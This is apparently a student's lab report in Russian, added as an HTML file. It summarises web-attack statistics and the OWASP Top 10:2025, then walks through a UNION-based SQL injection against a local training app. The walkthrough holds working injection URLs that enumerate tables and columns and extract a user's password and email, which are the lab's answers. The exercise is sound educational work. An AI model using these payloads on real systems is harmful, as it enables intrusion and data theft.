@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Лабораторная работа №1</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 20px; line-height: 1.6; color: #333; }
+        h1 { border-bottom: 2px solid #333; padding-bottom: 10px; }
+        a { color: #0066cc; }
+        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-size: 0.9em; word-break: break-all; }
+        pre { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        strong { color: #111; }
+    </style>
+</head>
+<body>
+<h1>Часть I</h1>
+<p><a href="https://ptsecurity.com/research/analytics/aktualnye-kiberugrozy-iii-kvartal-2024-goda/">По данным Positive Technologies</a> за Q3 2024, эксплуатация уязвимостей использовалась в 33% успешных атак на организации. За Q4 2024 – Q1 2025 цифра похожая: 31%.</p>
+<p><a href="https://www.verizon.com/business/resources/reports/dbir/">Verizon DBIR 2025</a> покрывает 22 тыс. инцидентов. Базовые атаки на веб-приложения составили 12% всех утечек. Эксплуатация уязвимостей как начальный вектор: 20%, рост 34% за год. <a href="https://www.edgescan.com/inside-the-2025-verizon-dbir/">Edgescan</a> уточняет, что 42% всех эксплойтов были направлены на веб-приложения. SQL Injection держится на первом месте среди веб-уязвимостей с 2022 года.</p>
+<p><a href="https://owasp.org/Top10/2025/">OWASP Top 10:2025</a> (актуальный рейтинг):</p>
+<ol>
+<li>Broken Access Control</li>
+<li>SSRF</li>
+<li>Software Supply Chain Failures</li>
+<li>Cryptographic Failures</li>
+<li>Injection (SQLi, XSS и др.)</li>
+<li>Insecure Design</li>
+<li>Security Misconfiguration</li>
+<li>Vulnerable and Outdated Components</li>
+<li>Identity and Authentication Failures</li>
+<li>Mishandling of Exceptional Conditions</li>
+</ol>
+<p>Инъекции были на 3-м месте, сейчас на 5-м. При этом SQL Injection всё ещё самая частая веб-уязвимость по Verizon.</p>
+<h1>Часть II</h1>
+<p><code>http://localhost:8080/task/?id=1</code> выдаёт <code>Ваш id:1, Ваш логин:admin</code></p>
+<p><code>http://localhost:8080/task/?id=2</code> выдаёт <code>Ваш id:2, Ваш логин:Volk</code></p>
+<p><code>http://localhost:8080/task/?id=1&#39;</code> ломает запрос кавычкой. MySQL отвечает ошибкой: <code>near &#39;&#39;1&#39;&#39; LIMIT 0,1</code>. Ввод не экранируется, инъекция возможна.</p>
+<p>Определяю количество колонок через ORDER BY:</p>
+<p><code>http://localhost:8080/task/?id=1&#39;+ORDER+BY+3--+</code> работает</p>
+<p><code>http://localhost:8080/task/?id=1&#39;+ORDER+BY+4--+</code> даёт <code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code>, колонок 3</p>
+<p>Пробую UNION SELECT (id=-1 чтобы оригинальный запрос вернул пустоту):</p>
+<p><code>http://localhost:8080/task/?id=-1&#39;+UNION+SELECT+1,2,3--+</code> выдаёт <code>id:1, логин:2</code>. На страницу выводятся 1-я и 2-я колонки.</p>
+<p>Таблицы в базе:</p>
+<p><code>http://localhost:8080/task/?id=-1&#39;+UNION+SELECT+1,group_concat(table_name),3+FROM+information_schema.tables+WHERE+table_schema=database()--+</code> результат: <code>emails,users</code></p>
+<p>Колонки users:</p>
+<p><code>http://localhost:8080/task/?id=-1&#39;+UNION+SELECT+1,group_concat(column_name),3+FROM+information_schema.columns+WHERE+table_name=&#39;users&#39;--+</code> результат: <code>id,username,password</code> (+ системные USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS)</p>
+<p>Колонки emails:</p>
+<p><code>http://localhost:8080/task/?id=-1&#39;+UNION+SELECT+1,group_concat(column_name),3+FROM+information_schema.columns+WHERE+table_name=&#39;emails&#39;--+</code> результат: <code>id, email_id</code></p>
+<p><strong>Задание 1. Пароль Volk2:</strong></p>
+<p><code>http://localhost:8080/task/?id=-1&#39;+UNION+SELECT+1,password,3+FROM+users+WHERE+username=&#39;Volk2&#39;--+</code> <strong>пароль: Wa spoiuuuuu</strong></p>
+<p><strong>Задание 2. Почта Vinni-pukh:</strong></p>
+<p>Username и email лежат в разных таблицах. Сначала нужен id. Из дампа пользователей: Vinni-pukh это id=4.</p>
+<p><code>http://localhost:8080/task/?id=-1&#39;+UNION+SELECT+1,email_id,3+FROM+emails+WHERE+id=4--+</code> <strong>почта: <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></strong></p>
+
+</body></html>
